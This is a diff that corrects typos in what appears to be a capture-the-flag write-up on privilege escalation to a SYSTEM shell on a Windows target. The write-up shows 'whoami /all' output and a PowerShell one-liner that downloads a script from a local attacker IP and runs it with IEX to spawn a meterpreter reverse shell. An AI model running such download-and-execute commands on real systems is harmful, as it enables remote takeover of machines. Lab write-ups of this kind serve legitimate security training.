@@ -484,7 +484,7 @@ C:\shared>
 
 ![](https://media.tenor.com/HMsPIS-VAxAAAAAC/gandalf-lotr.gif)
 
-After going for the user flag (LOL) we can escalate privileges to get an SYSTEN shell. For that, we check our privileges and groups using the __whoami /all__ comman. We'll receive an output similar to the one below.
+After going for the user flag (LOL) we can escalate privileges to get an SYSTEM shell. For that, we check our privileges and groups using the __whoami /all__ comman. We'll receive an output similar to the one below.
 
 ```
 C:\shared>whoami /all
@@ -531,7 +531,7 @@ C:\shared>
 ```
 We can observe we have a high-integrity shell, and we are part of NT AUTHORITY. So after all that ropping, I went the easy way and first called a PowerShell reverse_shell and generate a 32-bit meterpreter shell  (remember, we are running on an x86 process).
 
-Next, let's host the reverse shell in a Python web server. and execute PowerShell to download and execute the meterpreter reverse shell with the followign command.
+Next, let's host the reverse shell in a Python web server. and execute PowerShell to download and execute the meterpreter reverse shell with the following command.
 
 ```
 (new-object system.net.webclient).DownloadString('http://10.8.0.138/dplashell.txt') | IEX
